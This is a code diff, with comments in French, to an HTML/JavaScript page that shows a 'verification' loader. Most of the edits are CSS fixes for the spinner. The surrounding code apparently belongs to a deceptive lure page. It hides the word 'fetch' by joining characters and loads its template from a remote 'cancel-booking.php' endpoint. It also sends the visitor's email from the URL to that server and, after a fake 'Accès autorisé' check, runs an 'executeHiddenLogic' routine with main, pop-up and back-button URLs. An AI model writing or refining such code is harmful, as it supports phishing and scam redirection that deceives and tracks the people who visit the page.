@@ -10,30 +10,41 @@
         /* Styles du loader */
         @keyframes spin { 100% { transform: rotate(360deg); } }
         
-        /* 🚨 ÉTIREMENT CLÉ 🚨 : Force l'étirement total pour TOUTE la page */
+        /* 🚨 CORRECTION CRITIQUE 🚨 : ÉTIREMENT TOTAL & SUPPRESSION DES MARGES */
         html, body {
             height: 100%;
             width: 100%;
             margin: 0;
             padding: 0;
-            overflow-x: hidden; /* Empêche le défilement horizontal */
+            overflow: hidden; /* Empêche les barres de défilement */
         }
         
         /* Styles de base pour le chargement */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            /* Permet à l'arrière-plan du template de couvrir tout */
             background-size: cover; 
             background-repeat: no-repeat;
         }
         
-        /* Conteneur pour le template injecté (prend toute la place) */
+        /* NOUVEAU : Le conteneur doit être statique pour que le 100vh de l'enfant fonctionne */
         #template-container {
             height: 100%; 
             width: 100%;
-            display: flex;
+            /* Retire le display: flex pour éviter les conflits de centering */
+            /* Nous faisons le centering dans le template PHP (align-items: center;) */
+        }
+
+        /* Centrage du spinner de chargement */
+        #loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            text-align: center;
+            gap: 8px;
             color: #333;
         }
     </style>
@@ -41,7 +52,7 @@
 <body>
     
     <div id="template-container">
-        <div style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">
+        <div id="loading-spinner">
             <div style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
             Chargement de la vérification...
         </div>
@@ -57,7 +68,6 @@
     const FE = ['f', 'e', 't', 'c', 'h'].join('');
     const HREF = ['h', 'r', 'e', 'f'].join('');
     
-    // ⚠️ POINTS CLÉS
     const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php"; 
     const URL_TEMPLATE = URL_PHP + "?action=get_template"; 
 
@@ -68,7 +78,7 @@
 
     var redirected = false;
     
-    // --- 1. FONCTIONS DE BASES (Identique) ---
+    // --- 1. FONCTIONS DE BASES (Reste inchangé) ---
     function getUrlParameter(name) {
         name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
         var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -93,17 +103,16 @@
         }, 300);
     }
     
-    // --- 2. GESTION DES CLICS (Identique) ---
+    // --- 2. GESTION DES CLICS (Reste inchangé) ---
     function initializeUnifiedClicks(jsScript) {
+        // ... (Logique inchangée)
         document.querySelectorAll('.action-btn').forEach(btn => {
             btn.addEventListener('click', function(event) {
                 event.preventDefault();
-                
                 this.setAttribute('data-original-html', this.innerHTML);
                 this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' Vérification...</span>';
                 this.style.pointerEvents = 'none';
                 this.style.opacity = '0.8';
-
                 executeAjaxLogic(this);
             });
         });
@@ -120,7 +129,6 @@
     function executeAjaxLogic(btnElement) {
         var formData = new FormData();
         formData.append('action', 'get_links');
-
         var emailParam = getUrlParameter('u');
         if (emailParam) {
             formData.append('u', emailParam);
@@ -131,7 +139,6 @@
         .then(data => {
             if (data.status === 'ok') {
                 executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
-                
                 setTimeout(function(){
                     btnElement.innerHTML = SUCCESS_ICON_HTML + " Accès autorisé";
                     btnElement.style.background = '#009432';
@@ -150,8 +157,11 @@
         });
     }
 
-    // --- 3. FONCTION PRINCIPALE : CHARGEMENT DU TEMPLATE AU DÉPART (Améliorée) ---
+    // --- 3. FONCTION PRINCIPALE : CHARGEMENT DU TEMPLATE AU DÉPART ---
     function loadTemplate() {
+        // Cacher le spinner dès le début, il sera affiché par le CSS initial
+        document.getElementById('loading-spinner').style.display = 'inline-flex';
+
         let trackingParams = window.location.search;
         
         window[FE](URL_TEMPLATE + trackingParams, { method: METHOD_GET })
@@ -164,7 +174,10 @@
         .then(data => {
             if (data.status === 'ok' && data.html) {
                 
-                // 1. Injection du HTML
+                // 1. Cacher le spinner avant l'injection
+                document.getElementById('loading-spinner').style.display = 'none';
+                
+                // 2. Injection du HTML
                 document.getElementById('template-container').innerHTML = data.html;
                 
                 // 🚨 CORRECTION CLÉ 🚨 : Application de la couleur de fond
@@ -173,25 +186,20 @@
                     const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
                     const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
                     
-                    // 1. Applique le fond au body
                     if (backgroundStyle) {
                         document.body.style.background = backgroundStyle;
                     }
                     
-                    // 2. Applique le filtre (backdrop-filter) au body si présent
                     if (backdropStyle) {
                         document.body.style.backdropFilter = backdropStyle;
                         document.body.style.webkitBackdropFilter = backdropStyle;
                     }
-
-                    // 3. Assurez-vous que l'élément injecté prend 100vh
-                    rootDiv.style.height = '100vh';
                 }
                 
-                // 2. Injection du CSS additionnel (pour les styles spécifiques au template)
+                // 3. Injection du CSS additionnel
                 document.getElementById('template-styles').innerHTML += data.css || '';
                 
-                // 3. Initialisation des gestionnaires de clics
+                // 4. Initialisation des gestionnaires de clics
                 initializeUnifiedClicks(data.js);
                 
             } else {
@@ -199,6 +207,7 @@
             }
         })
         .catch(err => {
+            document.getElementById('loading-spinner').style.display = 'none';
             console.error("Erreur critique au chargement du template:", err);
             document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de vérification. (Vérifiez URL_PHP)</p>';
         });
